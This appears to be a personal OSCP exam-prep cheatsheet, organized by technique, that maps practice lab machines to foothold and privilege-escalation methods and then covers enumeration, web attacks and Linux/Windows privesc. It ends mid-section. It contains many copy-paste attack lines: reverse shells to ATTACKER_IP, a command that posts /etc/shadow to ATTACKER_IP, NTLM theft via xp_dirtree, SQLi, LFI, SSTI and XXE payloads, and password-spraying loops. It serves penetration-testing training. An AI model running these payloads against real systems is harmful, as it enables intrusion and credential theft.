# 🔥 OSCP Exam Cheatsheet — LainKusanagi Machine Techniques

> **Built from walkthroughs of every machine on the LainKusanagi OSCP-Like list.**
> Organized by technique for rapid exam-day reference.

---

## ⚡ PRACTICE — THE 10-POINT GAP PLAN

> **Based on practice lab performance. You need 70. The gap is ONE standalone.**
> **You've proven you can own AD (multiple practice attempts). The blocker is standalones.**

### The 3 Rules That Get You From 60 → 70

```
RULE 1: AD FIRST, ALWAYS (you've proven this works — 40 pts locked in multiple practice attempts)
  → Budget: 4 hours MAX. You've done this twice. Trust your methodology.

RULE 2: CREDS = SPRAY = WIN (your #1 anti-pattern from 4 attempts)
  → EVERY password found → nxc smb/winrm/rdp against ALL machines within 60 seconds
  → a practice attempt: Had API creds for a target but never tried evil-winrm (20 pts left on table)
  → a practice attempt: Had Unattend.xml creds but never sprayed them (40 pts left on table)
  → This single habit change is worth 10-20 points

RULE 3: 90-MINUTE STANDALONE RULE — MOVE OR DIE
  → 90 min with no shell? Screenshot everything, MOVE to next standalone
  → Your best exam had AD(40) + standalone(20) = 60. You need ONE more local.txt or proof.txt
  → A user flag (local.txt) on ANY standalone = 10 pts = PASS with AD + bonus
```

### Your Personal Weakness Checklist (Extracted from practice analysis)
```
□ Found creds? → TRY THEM ON WINRM/SSH/RDP/SMB WITHIN 60 SECONDS (not after 2hrs of API fuzzing)
□ Found Unattend.xml? → READ IT. Decode base64. Spray the password EVERYWHERE.
□ Found PowerShell transcript? → READ IT. Look for commands with passwords.
□ Expired password (ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED)?
  → Password IS VALID. Try: evil-winrm, smbpasswd to change it, psexec, wmiexec
□ AES-256 ZIP? → zip2john + john (NOT fcrackzip). Extract with 7z (NOT unzip).
□ FTP passive mode failure? → Toggle: passive off, or use lftp/curl
□ UAC disabled (EnableLUA=0)? → Any local admin technique = instant SYSTEM
□ Redis exposed? → redis-rogue-server (fix encoding: gb18030 → utf-8)
□ Firefox profile found? → firefox_decrypt.py → spray ALL extracted passwords
```

---

## Table of Contents

0. [⚡ next attempt — The 10-Point Gap Plan](#attempt-5--the-10-point-gap-plan)
1. [Machine-to-Technique Quick Reference](#machine-to-technique-quick-reference)
2. [Enumeration Methodology](#enumeration-methodology)
3. [Web Application Attacks](#web-application-attacks)
4. [Initial Foothold Techniques](#initial-foothold-techniques)
5. [Linux Privilege Escalation](#linux-privilege-escalation)
6. [Windows Privilege Escalation](#windows-privilege-escalation)
7. [Active Directory Attacks](#active-directory-attacks)
8. [Password Attacks](#password-attacks)
9. [File Transfers](#file-transfers)
10. [Shells & Upgrades](#shells-upgrades)
11. [Client-Side Payloads](#client-side-payloads)
12. [Pivoting & Tunneling](#pivoting-tunneling)
13. [Useful One-Liners](#useful-one-liners)
14. [Windows Persistence & Post-Exploitation](#windows-persistence-post-exploitation)
15. [🔲 STANDALONE MACHINE DECISION-TREE CHECKLIST](#standalone-machine-decision-tree-checklist)
16. [🔲 ACTIVE DIRECTORY SET — FULL ATTACK CHAIN CHECKLIST](#active-directory-set-full-attack-chain-checklist)
17. [Exam Day Quick Reference](#exam-day-quick-reference)
18. [🎯 EXAM DAY BATTLE PLAN — Intelligence from Recent Passers (2025-2026)](#exam-day-battle-plan-intelligence-from-recent-passers-2025-2026)
19. [🔪 WEB ATTACK QUICK REFERENCE — Copy-Paste Exam Ready](#web-attack-quick-reference-copy-paste-exam-ready)
20. [🥔 POTATO DECISION TREE — SeImpersonatePrivilege Quick Reference](#potato-decision-tree-seimpersonateprivilege-quick-reference)
21. [🔄 FILE TRANSFER CHEATSHEET — Every Method You'll Need](#file-transfer-cheatsheet-every-method-youll-need)
22. [📸 SCREENSHOT CHECKLIST — Don't Lose Points on Documentation](#screenshot-checklist-dont-lose-points-on-documentation)
23. [🐚 REVERSE SHELL ARSENAL — Exam-Ready One-Liners](#reverse-shell-arsenal-exam-ready-one-liners)
24. [🏰 AD SET DEEP DIVE — Assumed Breach to DC Compromise](#ad-set-deep-dive-assumed-breach-to-dc-compromise)
25. [🔧 JENKINS EXPLOITATION — The Legendary OSCP Box](#jenkins-exploitation-the-legendary-oscp-box)
26. [📡 API TESTING — OSCP Web Attack Vector](#api-testing-oscp-web-attack-vector)
27. [🔁 AD LOCAL PRIVESC WITHIN LATERAL MOVEMENT — The Step People Fail On](#ad-local-privesc-within-lateral-movement-the-step-people-fail-on)
28. [🔧 JENKINS IN AD — The "Impossible" Set Survival Guide](#jenkins-in-ad-the-impossible-set-survival-guide)
29. [🔓 AD PRIVILEGE GROUPS CHEATSHEET — Instant Wins](#ad-privilege-groups-cheatsheet-instant-wins)


## Machine-to-Technique Quick Reference

### HackTheBox — Linux

| Machine | Initial Foothold | Privilege Escalation |
|---------|-----------------|---------------------|
| **Sea** | WonderCMS CVE-2023-41425 (XSS→RCE), contact form injection | Port forwarding internal service (8080), command injection in log analyzer |
| **Nibbles** | Nibbleblog 4.0.3 file upload (CVE-2015-6967) | sudo on writable bash script (`monitor.sh`) |
| **Solidstate** | Apache James 2.3.2 RCE (default creds admin:admin) | Writable cron job script |
| **Poison** | LFI → log poisoning / base64 encoded password in `pwdbackup.txt` | VNC credentials in secret file, SSH tunneling |
| **Knife** | PHP/8.1.0-dev backdoor (`User-Agentt` header RCE) | sudo knife (GTFOBins) |
| **Sunday** | Finger enumeration → SSH brute force (port 22022) | sudo wget (overwrite /etc/shadow or /root/troll) |
| **Pilgrimage** | Git repo exposure → ImageMagick CVE-2022-44268 (arbitrary file read) | Binwalk CVE-2022-4510 RCE via inotifywait cron |
| **Cozyhosting** | Spring Boot Actuator session hijack → command injection in SSH username | PostgreSQL creds → hash cracking → sudo ssh (GTFOBins) |
| **Codify** | Node.js vm2 sandbox escape CVE-2023-30547 | Bash script password comparison vulnerability (brute force) |
| **Tartarsauce** | WordPress plugin gwolle-gb RFI (CVE-2015-8351) | tar wildcard injection via sudo |
| **Artic** | Adobe ColdFusion 8 directory traversal + file upload | JuicyPotato (SeImpersonatePrivilege) |
| **Jarvis** | SQLi in PHPMyAdmin → SQL command execution | systemctl SUID (custom service file) |
| **Bashed** | Webshell (phpbash) already on server | Cron job running as root |
| **Irked** | UnrealIRCd 3.2.8.1 backdoor RCE | SUID binary with `.backup` file containing steg password |
| **Popcorn** | TorrentHoster file upload bypass | Linux kernel exploit (dirtycow / full-nelson) |
| **Broker** | ActiveMQ CVE-2023-46604 RCE (default creds admin:admin) | sudo nginx (arbitrary file read/write) |
| **Analytics** | Metabase pre-auth RCE CVE-2023-38646 | Container escape via host kernel OverlayFS CVE-2023-2640 |
| **Networked** | PHP file upload bypass (double extension + magic bytes) | Command injection in network script via crafted filename |
| **UpDown** | SSTI / disabled function bypass via `.phar` upload | sudo `easy_install` (GTFOBins) |
| **Swagshop** | Magento CVE-2015-1397 (SQL injection) + form key auth bypass | sudo vi (GTFOBins) |
| **Nineveh** | Hydra brute force on phpLiteAdmin + LFI → RCE via database file | chkrootkit 0.49 local privesc (cron) |
| **Pandora** | SNMP enumeration → creds → SSH | Pandora FMS SQLi CVE-2021-32099 → SUID binary path hijack |
| **OpenAdmin** | OpenNetAdmin 18.1.1 RCE | Internal web app creds → SSH key → sudo nano (GTFOBins) |
| **Precious** | pdfkit 0.8.6 command injection (CVE-2022-25765) | YAML deserialization via `henry`'s `update_dependencies.rb` |
| **Busqueda** | Searchor 2.4.0 eval injection | Gitea creds in `.git/config` → docker inspect → relative path exploit |
| **Monitored** | Nagios XI API key via SNMP → SQLi auth bypass | sudo service management scripts |
| **BoardLight** | Dolibarr CMS default creds → PHP reverse shell | Enlightenment DE SUID exploit CVE-2022-37706 |
| **Light** | SQLi (blind) in light controller app | Direct DB credential extraction |
| **Magic** | SQLi login bypass + file upload (magic bytes) | SUID `sysinfo` → path hijack |
| **Help** | HelpDeskZ file upload (predictable naming) | Kernel exploit |
| **Editorial** | SSRF → internal API → credentials | Git log credential exposure → sudo python script with insecure import |
| **Builder** | Jenkins CVE credential extraction | Pipeline script console / Groovy RCE |
| **Markup** | XXE injection → SSH key extraction | Scheduled task with writable script |
| **Tabby** | LFI → Tomcat manager creds in config | LXD/LXC group privilege escalation |
| **Love** | SSRF → internal vote admin → file upload RCE | AlwaysInstallElevated |
| **Usage** | SQLi (blind) → admin panel → file upload with `.php.jpg` | Wildcard injection in 7zip backup cron |
| **Secnotes** | CSRF → get admin creds → SMB share write → PHP shell | WSL bash.exe as admin |
| **Devvortex** | Joomla CVE-2023-23752 info disclosure → admin creds | apport-cli CVE-2023-1326 (sudo) |
| **Mailing** | Outlook CVE-2024-21413 MonikerLink → NTLM theft | LibreOffice macro CVE-2023-2255 → writable scheduled tasks dir |
| **Access** | FTP anonymous → `.mdb` file → creds → Outlook `.pst` → more creds | Stored credentials (cmdkey) → runas /savecred |

### HackTheBox — Windows

| Machine | Initial Foothold | Privilege Escalation |
|---------|-----------------|---------------------|
| **Jerry** | Tomcat default creds (tomcat:s3cret) → WAR file deploy | Already SYSTEM |
| **Netmon** | FTP anonymous access → PRTG config with creds | PRTG notification command execution |
| **Servmon** | FTP anonymous → NVMS-1000 directory traversal → SSH creds | NSClient++ privesc (port forwarding + API) |
| **Chatterbox** | AChat buffer overflow | Achat already admin / icacls permission abuse |
| **Jeeves** | Jenkins Groovy script console | KeePass database → pass-the-hash admin |
| **Sniper** | RFI via PHP include | CHM file → user creds → rogue potato |
| **Querier** | XLSM macro → NTLM theft via xp_dirtree | GPP cpassword / service account abuse |
| **Giddy** | SQLi → NTLM theft via xp_dirtree | UniFi Video service exploit (DLL hijack) |
| **Remote** | NFS mount → Umbraco DB → admin hash cracking → RCE | TeamViewer credential extraction |
| **Buff** | Gym Management System 1.0 unauth RCE | CloudMe 1.11.2 buffer overflow (port forward) |
| **Bounty** | IIS web.config upload (.config extension bypass) | JuicyPotato (SeImpersonatePrivilege) |

### HackTheBox — Active Directory & Networks

| Machine | Initial Foothold | Lateral Movement / Privesc |
|---------|-----------------|---------------------------|
| **Active** | SMB null session → GPP cpassword decrypt | Kerberoasting (Administrator SPN) |
| **Forest** | AS-REP Roasting (no preauth) | BloodHound → WriteDacl abuse → DCSync |
| **Sauna** | AS-REP Roasting (username enumeration from website) | AutoLogon creds → DCSync via svc_loanmgr |
| **Monteverde** | SMB enumeration → password = username | Azure AD Connect credential extraction |
| **Timelapse** | SMB share → PFX certificate in ZIP (john cracking) | LAPS password via AD group membership |
| **Flight** | NTLM theft via file inclusion on website | Writable web directory → RunAs → service abuse |
| **Return** | Printer LDAP config → capture creds → Server Operators group | Service binary path modification |
| **Blackfield** | AS-REP Roasting → RPC password change → LSASS dump | SeBackupPrivilege → ntds.dit extraction |
| **Cicada** | SMB guest enumeration → password spray → user pivot chain | SeBackupPrivilege → SAM/SYSTEM dump |
| **Escape** | MSSQL creds on share → NTLM theft via xp_dirtree → silver ticket | ADCS ESC1 (certipy) → Administrator |
| **Certified** | LDAP enumeration → password in description | ESC9 / certificate abuse |
| **Puppy** | LDAP creds in description | DCSync via delegation abuse |
| **Administrator** | GenericAll / targeted Kerberoasting | Full AD takeover chain |

### Proving Grounds Practice — Linux

| Machine | Initial Foothold | Privilege Escalation |
|---------|-----------------|---------------------|
| **ClamAV** | Sendmail + ClamAV milter RCE (CVE-2007-4560) | Already root from exploit |
| **Pelican** | Exhibitor for ZooKeeper RCE (config injection) | gcore dump of password manager process → sudo |
| **Internal** | CMS Made Simple SQLI → admin → file upload | Path hijack on writable binary / cron |
| **Bratarina** | SMTP OpenSMTPD RCE (CVE-2020-7247) | Already root |
| **Craft** | OFBiz CVE pre-auth RCE | Docker group escape |
| **Pebbles** | ZoneMinder SQLi / LFI | MySQL running as root → UDF |
| **Nibbles (PG)** | PostgreSQL default creds → command execution | SUID find binary |
| **Hetemit** | Python code injection in network service | systemd timer/service writable by user |
| **ZenPhoto** | ZenPhoto CMS file upload | Writable cron job |
| **Nukem** | WordPress plugin exploit | SUID / writable service |
| **Shenzi** | GetSimple CMS RCE | Cron / SUID abuse |
| **CockpitCMS** | Cockpit CMS NoSQLi user/password extraction | SUID / cron |
| **AuthBy** | FTP anonymous upload to web directory | WriteDacl / writable service |
| **Postfish** | SMTP user enumeration → default creds | Mail filter / cron executing as root |
| **Hawat** | Issue tracker SSRF + SQLi | Cron / writable script |
| **Walla** | RFI or webapp exploit | Writable script in /etc/cron |
| **Sorcerer** | SUID exploitation / web app | Writable startup scripts |
| **Sybaris** | Redis unauthorized access → webshell | Cronjob abuse |
| **Peppo** | FTP access → restricted shell | Docker breakout |
| **Readys** | WordPress plugin exploit | Redis + cron exploitation |
| **Astronaut** | GravCMS RCE exploit | PHP config / writable files |
| **Slort** | RFI in PHP application | Writable scheduled task |
| **Hunit** | Git hooks exploitation | SUID / sudo |
| **PC** | Web application exploit | Writable service file |
| **Apex** | LibreNMS RCE | MySQL / SUID |
| **Extplorer** | eXtplorer file manager upload | Cron / writable scripts |
| **DVR4** | ArgusTV directory traversal | Service running as SYSTEM |

### Proving Grounds Practice — Windows

| Machine | Initial Foothold | Privilege Escalation |
|---------|-----------------|---------------------|
| **Kevin** | HP Power Manager BoF (CVE-2009-2685) | Already SYSTEM |
| **Access (PG)** | Web app file upload / default creds | SeImpersonatePrivilege (PrintSpoofer) |
| **Resourced** | Creds via SMB → RBCD (Resource-Based Constrained Delegation) | RBCD → silver ticket → DCSync |
| **Payday** | CS-Cart exploit → shell | Stored creds / service abuse |
| **Algernon** | SmarterMail RCE (CVE-2019-7214) | Already SYSTEM |
| **Nagoya** | Web app exploit | SeImpersonatePrivilege |
| **Snookumsz** | Simple PHP application RFI | JuicyPotato / PrintSpoofer |
| **Jacko** | H2 Database console RCE | Service binary hijack |
| **Hokkaido** | RPC / webapp exploit | PrintSpoofer |
| **Hutch** | LDAP creds → WebDAV upload → shell | LAPS password |
| **Vault** | VisualSVN file read + Drupal admin RCE | SeImpersonatePrivilege |
| **Nickel** | HTTP PUT method → web command | PDF with creds → SSH as admin |
| **MedJed** | Barracuda webshell / webapp exploit | Always writable directory service exploit |
| **Billyboss** | Sonatype Nexus RCE (CVE-2020-36518) | JuicyPotato / PrintSpoofer |
| **Cockpit** | Web app exploit | Service binary replacement |
| **Loader** | Boot2root / FTP upload | Service abuse |
| **Clue** | Cassandra / webapp exploit | Service abuse |
| **Hepet** | HelpDeskZ / web exploit | Writable service |

---

## Enumeration Methodology

### 🔑 MASTER CREDENTIAL WORKFLOW — Do This EVERY Time You Find Creds

> **This is the #1 lesson from 4 attempts. Every password goes through this pipeline.**

```bash
# === STEP 1: ADD TO MASTER CREDS FILE (keep running list!) ===
echo "username:password" >> /home/kali/master_creds.txt

# === STEP 2: SPRAY AGAINST ALL EXAM MACHINES (60 seconds, not 60 minutes) ===
# Replace $IP1-$IP6 with all exam machine IPs
for IP in $IP1 $IP2 $IP3 $IP4 $IP5 $IP6; do
  nxc smb $IP -u 'newuser' -p 'newpass' 2>/dev/null
  nxc winrm $IP -u 'newuser' -p 'newpass' 2>/dev/null
  nxc rdp $IP -u 'newuser' -p 'newpass' 2>/dev/null
  nxc ssh $IP -u 'newuser' -p 'newpass' 2>/dev/null
done

# === STEP 3: SPRAY AGAINST ALL KNOWN USERNAMES (if AD) ===
nxc smb $DC -u users.txt -p 'newpass' --continue-on-success
nxc smb $DC -u 'newuser' -p passwords.txt --continue-on-success

# === STEP 4: TRY HASH IF YOU HAVE ONE ===
nxc smb $IP1 $IP2 $IP3 -u 'user' -H 'NTLM_HASH'
nxc winrm $IP1 $IP2 $IP3 -u 'user' -H 'NTLM_HASH'
evil-winrm -i $IP -u 'user' -H 'NTLM_HASH'
```

### Justin's Scanning Methodology

**Full TCP scan with scripts and versions:**
```bash
sudo nmap -Pn -n $IP -sC -sV -p- --open -oN tcpall-scripts-version.nmap
```

**Top 100 UDP ports:**
```bash
sudo nmap -Pn -n $IP -sU --top-ports=100 --open -oN udptop100.nmap
```

**AD subnet discovery with Netexec:**
```bash
nxc smb 10.10.1.0/24
```

**Penelope.py (recommended shell catcher):**
```bash
sudo python3 penelope.py <listener-port>
```

### Port Scanning

```bash
# Full TCP scan
sudo nmap -p- --min-rate 5000 -sS -Pn -oN full_tcp.txt $IP

# Service + script scan on open ports
sudo nmap -p <PORTS> -sCV -oN detailed.txt $IP

# UDP top ports
sudo nmap -sU --top-ports 20 -oN udp.txt $IP

# Full automation (great for exam)
autorecon $IP --single-target --heartbeat 30
```

### Web Enumeration

```bash
# Directory brute-force
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 50 -o gobuster.txt

# Alternative with feroxbuster (recursive)
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o ferox.txt

# Subdomain enumeration
gobuster vhost -u http://$DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# Technology fingerprint
whatweb http://$IP

# Nikto scan
nikto -h http://$IP
```

### SMB Enumeration

```bash
# Null session
smbclient -L //$IP -N
smbmap -H $IP
smbmap -H $IP -u '' -p ''
crackmapexec smb $IP -u '' -p '' --shares
enum4linux -a $IP

# Authenticated
smbmap -H $IP -u 'user' -p 'pass'
smbclient //$IP/share -U 'user%pass'
crackmapexec smb $IP -u 'user' -p 'pass' --shares

# Download entire share
smbclient //$IP/share -U 'user%pass' -c 'recurse on; prompt off; mget *'

# Recursive listing
smbmap -H $IP -u 'user' -p 'pass' -R
```

### SNMP Enumeration

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP

# Walk SNMP
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# Specific OIDs for usernames/processes
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3     # TCP open ports
```

### LDAP Enumeration

```bash
# Anonymous bind
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local"
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" '(objectClass=person)' sAMAccountName description

# With creds
ldapsearch -x -H ldap://$IP -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local"
```

### NFS Enumeration

```bash
showmount -e $IP
mkdir /tmp/nfs && sudo mount -t nfs $IP:/share /tmp/nfs
```

### DNS Enumeration

```bash
dig axfr @$IP domain.htb
dnsrecon -d domain.htb -n $IP -t axfr
```

---

## Web Application Attacks

### SQL Injection

```bash
# Manual test
' OR 1=1-- -
' UNION SELECT 1,2,3-- -
admin' OR '1'='1'-- -

# ⚠️ SQLMAP IS NOT ALLOWED ON THE OSCP EXAM — manual only!
# Manual UNION extraction workflow:
# 1. Find column count: ' ORDER BY 1-- -  (increment until error)
# 2. Find visible columns: ' UNION SELECT 1,2,3-- -
# 3. Extract: ' UNION SELECT 1,user(),database()-- -
# 4. Tables: ' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
# 5. Columns: ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
# 6. Data: ' UNION SELECT 1,username,password FROM users-- -

# Blind boolean: ' AND SUBSTRING(database(),1,1)='a'-- -
# Time-based:   ' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -

# MSSQL: xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'powershell -e <BASE64>';-- -

# MSSQL: NTLM theft
'; EXEC xp_dirtree '\\ATTACKER_IP\share';-- -
# (Listen with responder: sudo responder -I tun0)
```

**Machines:** Jarvis (PHPMyAdmin SQLi), Querier (xp_dirtree), Giddy (xp_dirtree), Pebbles (ZoneMinder), Monitored (Nagios API SQLi), Usage (blind SQLi), Escape (xp_dirtree), Codify (blind login), Light (blind SQLi)

### Local File Inclusion (LFI)

```bash
# Basic
http://$IP/page?file=../../../etc/passwd
http://$IP/page?file=....//....//....//etc/passwd

# PHP wrappers
http://$IP/page?file=php://filter/convert.base64-encode/resource=index.php

# Log poisoning (after injecting PHP in User-Agent via nc/curl)
http://$IP/page?file=/var/log/apache2/access.log

# Null byte (older PHP)
http://$IP/page?file=../../../etc/passwd%00

# Windows
http://$IP/page?file=..\..\..\..\windows\system32\drivers\etc\hosts
```

**Machines:** Poison (log poisoning), Nineveh (LFI→RCE), Tabby (tomcat-users.xml), Pandora (SNMP→creds), Servmon (NVMS dir traversal)

### Remote File Inclusion (RFI)

```bash
# Host a PHP reverse shell
python3 -m http.server 80

# Inject
http://$IP/page?file=http://ATTACKER_IP/shell.php
```

**Machines:** Sniper, Swagshop, Snookumsz, Slort

### File Upload Bypass

```bash
# PHP reverse shell with bypasses
mv shell.php shell.php.jpg         # Double extension
mv shell.php shell.pHp             # Case manipulation
mv shell.php shell.php%00.jpg      # Null byte
# Add GIF89a; at top of PHP file  # Magic bytes

# .htaccess upload (allow PHP execution)
echo "AddType application/x-httpd-php .evil" > .htaccess

# Web.config upload (IIS)
# Upload web.config that executes ASP code

# Bypass content-type check
# Change Content-Type to image/jpeg in Burp
```

**Machines:** Nibbles (image plugin upload), Magic (magic bytes), Networked (double ext + magic bytes), Bounty (web.config), UpDown (.phar bypass), Love (admin file upload), BoardLight (Dolibarr PHP shell)

### Server-Side Request Forgery (SSRF)

```bash
# Test internal ports
http://$IP/fetch?url=http://127.0.0.1:8080
http://$IP/fetch?url=http://127.0.0.1:FUZZ  # Fuzz internal ports

# Cloud metadata
http://$IP/fetch?url=http://169.254.169.254/latest/meta-data/
```

**Machines:** Editorial (internal API), Love (voter admin), Hawat

### XML External Entity (XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Machines:** Markup (XXE → SSH key)

### Server-Side Template Injection (SSTI)

```bash
# Detection
{{7*7}}  →  49
${7*7}   →  49
<%= 7*7 %>  →  49

# Jinja2 RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Machines:** UpDown

### Command Injection

```bash
; id
| id
|| id
`id`
$(id)
%0aid
; ping -c 3 ATTACKER_IP  # Blind test
```

**Machines:** Sea (log analyzer), Cozyhosting (SSH username field), Precious (pdfkit), Busqueda (Searchor eval), Networked (filename injection)

---

## Initial Foothold Techniques

### Common CVEs Seen on OSCP Machines

```bash
# Apache James 2.3.2 - Default creds admin:admin + user creation RCE
# (Solidstate) - Create user, login via POP3, enumerate mail

# PHP 8.1.0-dev - Backdoor (Knife)
curl -H 'User-Agentt: zerodiumsystem("id");' http://$IP

# UnrealIRCd 3.2.8.1 - Backdoor (Irked)
echo "AB; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | nc $IP 6697

# OpenSMTPD < 6.6.2 - RCE CVE-2020-7247 (Bratarina)
# Send crafted SMTP mail with command in MAIL FROM

# ActiveMQ CVE-2023-46604 (Broker)
# ClassPathXmlApplicationContext deserialization

# Tomcat default creds (Jerry, Tabby)
# common: tomcat:s3cret, tomcat:tomcat, admin:admin
# Deploy WAR: msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war
# Upload via /manager/html or /manager/text/deploy

# WordPress
wpscan --url http://$IP/wp --enumerate ap,at,u --api-token $TOKEN
# Plugin exploits are very common

# Drupal / Joomla / CMS
# Always check version, searchsploit, and known CVEs
droopescan scan drupal -u http://$IP
joomscan -u http://$IP

# Jenkins (Jeeves, Builder)
# Groovy Script Console:
String host="ATTACKER_IP"; int port=4444;
String cmd="/bin/bash"; Socket s=new Socket(host,port);
Process p=[cmd].execute(); def is=p.inputStream, os=p.outputStream;
def err=p.errorStream;
Thread.start{while((b=is.read())!=-1)s.outputStream.write(b)};
s.inputStream.eachLine{p.outputStream.write((it+"\n").bytes);p.outputStream.flush()};s.close()

# Nibbleblog 4.0.3 - Arbitrary File Upload (Nibbles)
# Login → Plugins → My Image → Upload PHP reverse shell

# Metabase Pre-Auth RCE CVE-2023-38646 (Analytics)
# Obtain setup-token from /api/session/properties → POST to /api/setup/validate

# WonderCMS XSS→RCE CVE-2023-41425 (Sea)
# Python exploit creates XSS payload → inject via contact form → reverse shell

# Dolibarr default creds admin:admin (BoardLight)
# Create PHP webshell through website/page editor
```

### Searchsploit Workflow

```bash
searchsploit <software> <version>
searchsploit -m <EDB-ID>           # Mirror exploit to current dir
searchsploit -x <EDB-ID>           # Examine exploit
```

---

## Linux Privilege Escalation

### Quick Wins Checklist

```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null

# Find writable files/directories
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
# Check for running cron with pspy
./pspy64

# Check for passwords in files
grep -rli 'password' /var/www/ /opt/ /home/ 2>/dev/null
find / -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.ini" -o -name "*.bak" 2>/dev/null

# Internal services
ss -tlnp
netstat -tlnp

# Running processes
ps auxww

# Automated enumeration
./linpeas.sh
./linux-exploit-suggester.sh
```

### Sudo Abuse (GTFOBins)

```bash
# Common from LainKusanagi machines:
sudo vi -c '!sh'                                    # Swagshop
sudo nano → Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0  # OpenAdmin
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'        # Knife
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x          # Cozyhosting
sudo easy_install /tmp/setup.py                      # UpDown
sudo wget --post-file=/etc/shadow ATTACKER_IP        # Sunday
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh  # Tartarsauce

# General pattern: check GTFOBins for ANY binary in sudo -l
```

### SUID Binary Exploitation

```bash
# Custom SUID binary calling another command without full path
# Example: SUID binary calls "cat" → path hijack
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/cat && chmod +x /tmp/cat

# Common SUID escalation (Magic - sysinfo)
echo '/bin/bash -p' > /tmp/lshw && chmod +x /tmp/lshw
export PATH=/tmp:$PATH
/usr/bin/sysinfo

# SUID find
find . -exec /bin/sh -p \; -quit

# SUID bash/dash
/bin/bash -p
```

**Machines:** Magic (sysinfo path hijack), Irked (SUID viewuser), Pandora (pandora_backup path hijack)

### Cron Job Exploitation

```bash
# Check for writable scripts called by cron
cat /etc/crontab
ls -la /etc/cron.d/
# Use pspy to detect hidden crons

# If script is writable → inject reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/script.sh

# Wildcard injection with tar (cron running: tar czf backup.tar.gz *)
cd /target/directory
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash\nbash -i >& /dev/tcp/IP/PORT 0>&1' > shell.sh
```

**Machines:** Solidstate, Bashed, Nineveh (chkrootkit), Usage (7zip wildcard), Networked

### Docker/LXD Escape

```bash
# Docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD/LXC group (Tabby)
# On attacker: build alpine image
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && sudo bash build-alpine
# Transfer to target
lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# Root filesystem at /mnt/root
```

**Machines:** Tabby (LXD), Craft (Docker), Peppo (Docker), Analytics (container escape)

### Kernel Exploits

```bash
# Check kernel version
uname -a
cat /etc/os-release

# DirtyPipe (CVE-2022-0847) - Linux 5.8+
# DirtyCow (CVE-2016-5195) - Linux < 4.8.3
# PwnKit (CVE-2021-4034) - pkexec polkit
# OverlayFS (CVE-2023-2640) - Ubuntu specific

# Use linux-exploit-suggester
./les.sh
```

**Machines:** Popcorn (kernel), Analytics (OverlayFS)

---

## Windows Privilege Escalation

### Quick Wins Checklist

```powershell
# Current user info
whoami /all
whoami /priv

# System info
systeminfo

# Check for stored creds
cmdkey /list
# If found → runas /savecred /user:admin cmd.exe

# Automated enum
.\winPEASx64.exe
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# Check services
sc query state=all
wmic service get name,pathname,startmode | findstr /v /i "C:\Windows"

# Scheduled tasks
schtasks /query /fo TABLE /nh

# Installed software
wmic product get name,version

# Network connections
netstat -ano

# Find interesting files
dir /s /b C:\Users\*.txt C:\Users\*.kdbx C:\Users\*.ini 2>nul
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.kdbx,*.ini -Recurse -ErrorAction SilentlyContinue

# 🔥 CHECK THESE ON EVERY WINDOWS BOX (from Practice Labs #2/#3):
# Unattend.xml — often contains cleartext/base64 passwords:
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Autounattend.xml
type C:\Windows\System32\Sysprep\Unattend.xml
# Look for: <AutoLogon>, <Password>, <Value> tags — decode base64 if present
# ⚠️ PRACTICE LESSON: You HAD this file with Admin creds and never read it!
# DECODE BASE64 VALUES IMMEDIATELY:
# powershell: [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64STRING"))
# kali: echo "BASE64STRING" | base64 -d

# PowerShell transcripts — may reveal commands with creds:
